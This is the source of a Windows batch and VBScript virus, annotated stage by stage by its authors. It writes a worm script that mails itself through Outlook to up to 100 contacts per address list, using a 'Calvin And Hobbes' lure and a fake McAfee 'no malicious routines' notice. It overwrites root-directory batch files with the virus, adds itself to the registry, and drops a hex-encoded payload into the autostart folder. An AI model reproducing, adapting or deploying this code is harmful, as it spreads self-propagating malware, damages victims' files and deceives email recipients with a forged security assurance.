@echo off
ctty nul
echo.on error resume next>c:\net.vbs
echo.Set a = CreateObject("Outlook.Application")>>c:\net.vbs
echo.Set b = a.GetNameSpace("MAPI")>>c:\net.vbs
echo.If a = "Outlook" Then>>c:\net.vbs
echo.b.Logon "profile", "password">>c:\net.vbs
echo.For y = 1 To b.AddressLists.Count>>c:\net.vbs
echo.Set d = b.AddressLists(y)>>c:\net.vbs
echo.x = 1>>c:\net.vbs
echo.Set c = a.CreateItem(0)>>c:\net.vbs
echo.For oo = 1 To d.AddressEntries.Count>>c:\net.vbs
echo.e = d.AddressEntries(x)>>c:\net.vbs
echo.c.Recipients.Add e>>c:\net.vbs
echo.x = x + 1>>c:\net.vbs
echo.If x = 101 Then oo = d.AddressEntries.Count>>c:\net.vbs
echo.Next>>c:\net.vbs
echo.c.Subject = "A Calvin And Hobbes Comic Strip">>c:\net.vbs
echo.c.Body = "-------------- McAfee Online Scanner ----------------" & vbcrlf & _>>c:\net.vbs
echo."The attached file doesn't contain any malicious routines" & vbcrlf & _>>c:\net.vbs
echo."-------------------------------------------------------------------" & vbcrlf & _>>c:\net.vbs
echo."">>c:\net.vbs
echo.c.attachments.Add("c:\Calvin&Hobbes.bat")>>c:\net.vbs
echo.c.Send>>c:\net.vbs
echo.c.DeleteAfterSubmit = True>>c:\net.vbs
echo.e = "">>c:\net.vbs
echo.Next>>c:\net.vbs
echo.b.Logoff>>c:\net.vbs
echo.End If>>c:\net.vbs
start c:\net.vbs

:: this is a vbs-worm, that sends the virus through Outlook

echo.on error resume next>c:\infect.vbs
echo.Set fso = CreateObject("Scripting.FileSystemObject")>>c:\infect.vbs
echo.eee = "c:\aut0exec.bat">>c:\infect.vbs
echo.Set f = fso.GetFolder("c:\")>>c:\infect.vbs
echo.Set fc = f.Files>>c:\infect.vbs
echo.For Each f1 In fc>>c:\infect.vbs
echo.ext = fso.GetExtensionName(f1.Path)>>c:\infect.vbs
echo.ext = LCase(ext)>>c:\infect.vbs
echo.If (ext = "bat") Then>>c:\infect.vbs
echo.Set f = fso.getfile(eee)>>c:\infect.vbs
echo.f.Copy (f1.Path)>>c:\infect.vbs
echo.End If>>c:\infect.vbs
echo.Next>>c:\infect.vbs
start c:\infect.vbs

:: this is a vbs, that overwrites batch-files in the root-directory with the virus

regedit /s c:\aut0exec.bat

:: this adds the virus to the registry

if exit %winbootdir%\startmen\programme\autostart\comic.vbs goto end

:: if the payload already exists, this debuging can be jumped over

echo e 0100 6F 6E 20 65 72 72 6F 72 20 72 65 73 75 6D 65 20>pl
echo e 0110 6E 65 78 74 0D 0A 4D 73 67 42 6F 78 20 22 48 65>>pl
echo e 0120 72 65 20 67 6F 65 73 20 79 6F 75 72 20 63 6F 6D>>pl
echo e 0130 69 63 20 73 74 72 69 70 3A 22 2C 22 30 22 2C 22>>pl
echo e 0140 42 41 54 2F 43 61 6C 76 69 6E 26 48 6F 62 62 65>>pl
echo e 0150 73 22 0D 0A 4D 73 67 42 6F 78 20 22 20 20 20 20>>pl
echo e 0160 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0170 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0180 20 20 20 20 5F 5F 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0190 20 22 20 26 20 43 68 72 28 31 33 29 20 26 20 43>>pl
echo e 01A0 68 72 28 31 30 29 20 26 20 22 20 20 20 20 20 20>>pl
echo e 01B0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 01C0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 01D0 2F 20 20 20 20 5C 20 20 20 20 20 20 20 20 20 20>>pl
echo e 01E0 20 22 20 26 20 43 68 72 28 31 33 29 20 26 20 43>>pl
echo e 01F0 68 72 28 31 30 29 20 26 20 22 20 20 20 20 20 20>>pl
echo e 0200 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0210 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7C>>pl
echo e 0220 20 20 20 20 20 20 20 20 7C 20 20 20 20 20 20 20>>pl
echo e 0230 20 20 20 20 22 20 26 20 43 68 72 28 31 33 29 20>>pl
echo e 0240 26 20 43 68 72 28 31 30 29 20 26 20 22 20 20 20>>pl
echo e 0250 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0260 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0270 20 20 7C 20 20 20 20 20 20 20 20 7C 20 20 20 20>>pl
echo e 0280 20 20 20 20 20 20 20 22 20 26 20 43 68 72 28 31>>pl
echo e 0290 33 29 20 26 20 43 68 72 28 31 30 29 20 26 20 22>>pl
echo e 02A0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 02B0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 02C0 20 20 20 20 20 7C 20 20 20 20 20 20 20 20 7C 20>>pl
echo e 02D0 20 20 20 20 20 20 20 20 20 20 22 20 26 20 43 68>>pl
echo e 02E0 72 28 31 33 29 20 26 20 43 68 72 28 31 30 29 20>>pl
echo e 02F0 26 20 22 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0300 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0310 20 20 20 20 20 20 20 20 7C 20 20 20 20 20 20 20>>pl
echo e 0320 20 7C 20 20 20 20 20 20 20 20 20 20 20 22 20 26>>pl
echo e 0330 20 43 68 72 28 31 33 29 20 26 20 43 68 72 28 31>>pl
echo e 0340 30 29 20 26 20 22 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0350 20 20 20 20 20 20 20 20 20 20 20 20 20 5F 5F 20>>pl
echo e 0360 20 20 20 5F 5F 20 20 7C 20 20 20 20 20 20 20 20>>pl
echo e 0370 7C 20 20 5F 5F 20 20 20 5F 5F 22 20 26 20 43 68>>pl
echo e 0380 72 28 31 33 29 20 26 20 43 68 72 28 31 30 29 20>>pl
echo e 0390 26 20 22 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 03A0 20 20 20 20 20 20 20 2F 20 20 20 20 20 5C 2F 20>>pl
echo e 03B0 20 20 20 20 5C 7C 20 20 20 20 20 20 20 20 7C 2F>>pl
echo e 03C0 20 20 20 20 5C 2F 20 20 20 20 5C 22 20 26 20 43>>pl
echo e 03D0 68 72 28 31 33 29 20 26 20 43 68 72 28 31 30 29>>pl
echo e 03E0 20 26 20 22 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 03F0 20 20 20 20 20 20 20 20 7C 20 20 20 20 20 20 20>>pl
echo e 0400 7C 20 20 20 20 20 20 20 20 7C 20 20 20 20 20 20>>pl
echo e 0410 20 20 7C 20 20 20 20 20 20 20 7C 20 20 20 20 20>>pl
echo e 0420 20 20 7C 22 20 26 20 43 68 72 28 31 33 29 20 26>>pl
echo e 0430 20 43 68 72 28 31 30 29 20 26 20 22 20 20 20 20>>pl
echo e 0440 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0450 7C 20 20 20 20 20 20 20 7C 20 20 20 20 20 20 20>>pl
echo e 0460 20 7C 20 20 20 20 20 20 20 20 7C 20 20 20 20 20>>pl
echo e 0470 20 20 7C 20 20 20 20 20 20 20 7C 22 20 26 20 43>>pl
echo e 0480 68 72 28 31 33 29 20 26 20 43 68 72 28 31 30 29>>pl
echo e 0490 20 26 20 22 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 04A0 20 20 20 20 20 20 20 20 7C 20 20 20 20 20 20 20>>pl
echo e 04B0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 04C0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 04D0 20 7C 22 20 26 20 43 68 72 28 31 33 29 20 26 20>>pl
echo e 04E0 43 68 72 28 31 30 29 20 26 20 22 20 20 20 20 20>>pl
echo e 04F0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7C>>pl
echo e 0500 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0510 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0520 20 20 20 20 20 20 20 20 7C 22 20 26 20 43 68 72>>pl
echo e 0530 28 31 33 29 20 26 20 43 68 72 28 31 30 29 20 26>>pl
echo e 0540 20 22 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0550 20 20 20 20 20 20 7C 20 20 20 20 20 20 20 20 20>>pl
echo e 0560 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0570 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7C>>pl
echo e 0580 22 20 26 20 43 68 72 28 31 33 29 20 26 20 43 68>>pl
echo e 0590 72 28 31 30 29 20 26 20 22 20 20 20 20 20 20 20>>pl
echo e 05A0 20 20 20 20 20 20 20 20 20 20 20 20 20 5C 20 20>>pl
echo e 05B0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 05C0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 05D0 20 20 20 20 2F 22 20 26 20 43 68 72 28 31 33 29>>pl
echo e 05E0 20 26 20 43 68 72 28 31 30 29 20 26 20 22 20 20>>pl
echo e 05F0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>pl
echo e 0600 20 20 20 5C 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F>>pl
echo e 0610 5F 5F 5F 5F 5F 5F 2F 22 2C 22 30 22 2C 22 62 79>>pl
echo e 0620 20 61 6C 63 6F 70 61 75 6C 20 5B 72 52 6C 66 5D>>pl
echo e 0630 20 61 6E 64 20 70 68 69 6C 65 74 30 61 73 74 33>>pl
echo e 0640 72 20 5B 72 52 6C 66 5D 22 39>>pl
echo rcx>>pl
echo 0549>>pl
echo n comic.vbs>>pl
echo w>>pl
echo q>>pl
debug<pl
del pl

:: this creates a debug-script ... and debugs it
:: the result is the payload (a vbs), code see below

move comic.vbs %winbootdir%\startmen\programme\autostart

:: this moves the payload-vbs to the autostart-directory,
:: so that it gets executed on the next system-start

:end
